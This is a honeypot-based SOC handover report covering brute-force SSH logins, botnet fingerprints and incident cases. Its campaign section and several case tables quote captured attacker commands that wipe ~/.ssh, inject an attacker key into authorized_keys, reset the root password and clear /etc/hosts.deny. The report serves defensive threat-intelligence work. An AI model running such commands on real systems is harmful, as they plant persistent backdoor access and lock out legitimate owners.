# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-06 |
| **Generated At** | 2026-06-06T13:51:30Z |
| **Shift Time** | 13:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **242** |
| Confirmed Threats | **233** |
| False Positives Filtered | **9** (3.7%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **11** |
| High Severity Cases | **54** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **188** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **166** |
| Unique Credential Pairs | **126** |
| Unique Usernames | **86** |
| Unique Passwords | **112** |
| Successful Auth Pairs | **36** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 54 |
| `345gs5662d34` | 21 |
| `frappe` | 3 |
| `user1` | 2 |
| `sftpuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 21 |
| `3245gs5662d34` | 21 |
| `123456` | 12 |
| `123` | 3 |
| `12345` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 21 |
| `root` | `3245gs5662d34` | 21 |
| `xh` | `123456` | 1 |
| `root` | `123qwe12` | 1 |
| `root` | `zaq1!QAZ` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123qwe12` | `101.100.194.181` | 2026-06-06T10:15:21 |
| `root` | `3245gs5662d34` | `101.100.194.181` | 2026-06-06T10:15:24 |
| `root` | `zaq1!QAZ` | `101.100.194.181` | 2026-06-06T10:17:05 |
| `root` | `Tt123456@` | `101.100.194.181` | 2026-06-06T10:18:46 |
| `root` | `sdfgh` | `101.100.194.181` | 2026-06-06T10:20:32 |
| `root` | `Paris2025` | `141.109.168.149` | 2026-06-06T10:24:06 |
| `root` | `3245gs5662d34` | `141.109.168.149` | 2026-06-06T10:24:10 |
| `root` | `Root@123` | `141.109.168.149` | 2026-06-06T10:25:53 |
| `root` | `cacat123` | `101.100.194.181` | 2026-06-06T10:28:45 |
| `root` | `Bb12345678` | `101.100.194.181` | 2026-06-06T10:30:27 |
| `root` | `Paris2024` | `101.100.194.181` | 2026-06-06T10:32:08 |
| `root` | `5tgb^YHN7ujm` | `101.100.194.181` | 2026-06-06T10:35:39 |
| `root` | `Aa778899` | `141.109.168.149` | 2026-06-06T10:36:32 |
| `root` | `Abc2024` | `101.100.194.181` | 2026-06-06T10:40:40 |
| `root` | `joshua` | `141.109.168.149` | 2026-06-06T10:41:54 |
| `root` | `1qaz!QAZ!QAZ` | `101.100.194.181` | 2026-06-06T10:47:16 |
| `root` | `gading` | `101.100.194.181` | 2026-06-06T10:52:21 |
| `root` | `12qw12qw` | `141.109.168.149` | 2026-06-06T10:54:19 |
| `root` | `123456123` | `101.100.194.181` | 2026-06-06T10:55:39 |
| `root` | `abc1234.` | `49.247.36.49` | 2026-06-06T11:00:25 |
| `root` | `3245gs5662d34` | `49.247.36.49` | 2026-06-06T11:00:29 |
| `root` | `sb123456` | `101.100.194.181` | 2026-06-06T11:00:47 |
| `root` | `12141214` | `141.109.168.149` | 2026-06-06T11:06:50 |
| `root` | `qwer12#$` | `141.109.168.149` | 2026-06-06T11:08:34 |
| `root` | `qwe123!@` | `103.75.198.228` | 2026-06-06T12:04:25 |
| `root` | `abcd@1234` | `103.75.198.228` | 2026-06-06T12:05:08 |
| `root` | `test@123` | `103.75.198.228` | 2026-06-06T12:05:13 |
| `root` | `!qaz@WSX` | `103.75.198.228` | 2026-06-06T12:06:14 |
| `root` | `0` | `103.75.198.228` | 2026-06-06T12:06:19 |
| `root` | `Huawei123` | `103.75.198.228` | 2026-06-06T12:06:24 |
| `root` | `root1234` | `103.75.198.228` | 2026-06-06T12:06:28 |
| `root` | `t0talc0ntr0l4!` | `103.75.198.228` | 2026-06-06T12:06:33 |
| `root` | `Aa123321` | `103.75.198.228` | 2026-06-06T12:08:03 |
| `root` | `Ab*123456` | `115.190.27.28` | 2026-06-06T13:27:34 |
| `root` | `Qwerasdf123` | `115.190.27.28` | 2026-06-06T13:29:13 |
| `root` | `Sz123456.` | `115.190.27.28` | 2026-06-06T13:40:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **242** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 128 |
| Go SSH scanner | 61 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 104 | 4 |
| `0a07365cc01f...` | Generic scanner | 57 | 1 |
| `03a80b21afa8...` | Modern SSH client | 19 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 104 | 4 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 57 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 19 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:OLwVBQuH4tMo"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `115.190.27.28`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `141.109.168.149`, `101.100.194.181`, `49.247.36.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **22** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS262773` | PROXXIMA TELECOMUNICACOES SA | 1 | LOW |
| `AS131602` | Hsin Yeong An Cable TV Co., Ltd. | 1 | HIGH |
| `AS25369` | Hydra Communications Ltd | 1 | HIGH |
| `AS212552` | BitCommand LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (54)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3cbcf9ce9850

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:15 |
| **Last Seen** | 2026-06-06 10:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:15:21` | `cowrie.session.connect` |
| `2026-06-06 10:15:21` | `cowrie.client.version` |
| `2026-06-06 10:15:21` | `cowrie.client.kex` |
| `2026-06-06 10:15:21` | `cowrie.login.success` |
| `2026-06-06 10:15:21` | `cowrie.session.params` |
| `2026-06-06 10:15:21` | `cowrie.command.input` |
| `2026-06-06 10:15:21` | `cowrie.command.failed` |
| `2026-06-06 10:15:22` | `cowrie.log.closed` |
| `2026-06-06 10:15:22` | `cowrie.session.params` |
| `2026-06-06 10:15:22` | `cowrie.command.input` |
| `2026-06-06 10:15:22` | `cowrie.session.file_download` |
| `2026-06-06 10:15:22` | `cowrie.log.closed` |
| `2026-06-06 10:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13171dd98944

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:15 |
| **Last Seen** | 2026-06-06 10:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:15:23` | `cowrie.session.connect` |
| `2026-06-06 10:15:23` | `cowrie.client.version` |
| `2026-06-06 10:15:23` | `cowrie.client.kex` |
| `2026-06-06 10:15:24` | `cowrie.login.success` |
| `2026-06-06 10:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f18b3a250d

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:17 |
| **Last Seen** | 2026-06-06 10:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:17:05` | `cowrie.session.connect` |
| `2026-06-06 10:17:05` | `cowrie.client.version` |
| `2026-06-06 10:17:05` | `cowrie.client.kex` |
| `2026-06-06 10:17:05` | `cowrie.login.success` |
| `2026-06-06 10:17:05` | `cowrie.session.params` |
| `2026-06-06 10:17:05` | `cowrie.command.input` |
| `2026-06-06 10:17:05` | `cowrie.command.failed` |
| `2026-06-06 10:17:05` | `cowrie.log.closed` |
| `2026-06-06 10:17:05` | `cowrie.session.params` |
| `2026-06-06 10:17:05` | `cowrie.command.input` |
| `2026-06-06 10:17:05` | `cowrie.session.file_download` |
| `2026-06-06 10:17:05` | `cowrie.log.closed` |
| `2026-06-06 10:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33afff331d61

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:17 |
| **Last Seen** | 2026-06-06 10:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:17:07` | `cowrie.session.connect` |
| `2026-06-06 10:17:07` | `cowrie.client.version` |
| `2026-06-06 10:17:07` | `cowrie.client.kex` |
| `2026-06-06 10:17:07` | `cowrie.login.success` |
| `2026-06-06 10:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bf987aa8ac1

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:18 |
| **Last Seen** | 2026-06-06 10:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:18:45` | `cowrie.session.connect` |
| `2026-06-06 10:18:45` | `cowrie.client.version` |
| `2026-06-06 10:18:46` | `cowrie.client.kex` |
| `2026-06-06 10:18:46` | `cowrie.login.success` |
| `2026-06-06 10:18:46` | `cowrie.session.params` |
| `2026-06-06 10:18:46` | `cowrie.command.input` |
| `2026-06-06 10:18:46` | `cowrie.command.failed` |
| `2026-06-06 10:18:46` | `cowrie.log.closed` |
| `2026-06-06 10:18:46` | `cowrie.session.params` |
| `2026-06-06 10:18:46` | `cowrie.command.input` |
| `2026-06-06 10:18:46` | `cowrie.session.file_download` |
| `2026-06-06 10:18:46` | `cowrie.log.closed` |
| `2026-06-06 10:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76edc10fc468

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:18 |
| **Last Seen** | 2026-06-06 10:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:18:48` | `cowrie.session.connect` |
| `2026-06-06 10:18:48` | `cowrie.client.version` |
| `2026-06-06 10:18:48` | `cowrie.client.kex` |
| `2026-06-06 10:18:48` | `cowrie.login.success` |
| `2026-06-06 10:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e57fd0eb897

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:20 |
| **Last Seen** | 2026-06-06 10:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:20:32` | `cowrie.session.connect` |
| `2026-06-06 10:20:32` | `cowrie.client.version` |
| `2026-06-06 10:20:32` | `cowrie.client.kex` |
| `2026-06-06 10:20:32` | `cowrie.login.success` |
| `2026-06-06 10:20:32` | `cowrie.session.params` |
| `2026-06-06 10:20:32` | `cowrie.command.input` |
| `2026-06-06 10:20:32` | `cowrie.command.failed` |
| `2026-06-06 10:20:32` | `cowrie.log.closed` |
| `2026-06-06 10:20:32` | `cowrie.session.params` |
| `2026-06-06 10:20:32` | `cowrie.command.input` |
| `2026-06-06 10:20:32` | `cowrie.session.file_download` |
| `2026-06-06 10:20:32` | `cowrie.log.closed` |
| `2026-06-06 10:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b03a7542652

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:20 |
| **Last Seen** | 2026-06-06 10:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:20:34` | `cowrie.session.connect` |
| `2026-06-06 10:20:34` | `cowrie.client.version` |
| `2026-06-06 10:20:34` | `cowrie.client.kex` |
| `2026-06-06 10:20:34` | `cowrie.login.success` |
| `2026-06-06 10:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb9f52e01ab9

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:24 |
| **Last Seen** | 2026-06-06 10:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:24:05` | `cowrie.session.connect` |
| `2026-06-06 10:24:05` | `cowrie.client.version` |
| `2026-06-06 10:24:05` | `cowrie.client.kex` |
| `2026-06-06 10:24:06` | `cowrie.login.success` |
| `2026-06-06 10:24:06` | `cowrie.session.params` |
| `2026-06-06 10:24:06` | `cowrie.command.input` |
| `2026-06-06 10:24:06` | `cowrie.command.failed` |
| `2026-06-06 10:24:06` | `cowrie.log.closed` |
| `2026-06-06 10:24:07` | `cowrie.session.params` |
| `2026-06-06 10:24:07` | `cowrie.command.input` |
| `2026-06-06 10:24:07` | `cowrie.session.file_download` |
| `2026-06-06 10:24:07` | `cowrie.log.closed` |
| `2026-06-06 10:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c711f54374

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:24 |
| **Last Seen** | 2026-06-06 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:24:09` | `cowrie.session.connect` |
| `2026-06-06 10:24:09` | `cowrie.client.version` |
| `2026-06-06 10:24:09` | `cowrie.client.kex` |
| `2026-06-06 10:24:10` | `cowrie.login.success` |
| `2026-06-06 10:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a685cdeaef

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:25 |
| **Last Seen** | 2026-06-06 10:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:25:52` | `cowrie.session.connect` |
| `2026-06-06 10:25:52` | `cowrie.client.version` |
| `2026-06-06 10:25:52` | `cowrie.client.kex` |
| `2026-06-06 10:25:53` | `cowrie.login.success` |
| `2026-06-06 10:25:53` | `cowrie.session.params` |
| `2026-06-06 10:25:53` | `cowrie.command.input` |
| `2026-06-06 10:25:53` | `cowrie.command.failed` |
| `2026-06-06 10:25:54` | `cowrie.log.closed` |
| `2026-06-06 10:25:54` | `cowrie.session.params` |
| `2026-06-06 10:25:54` | `cowrie.command.input` |
| `2026-06-06 10:25:54` | `cowrie.session.file_download` |
| `2026-06-06 10:25:54` | `cowrie.log.closed` |
| `2026-06-06 10:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
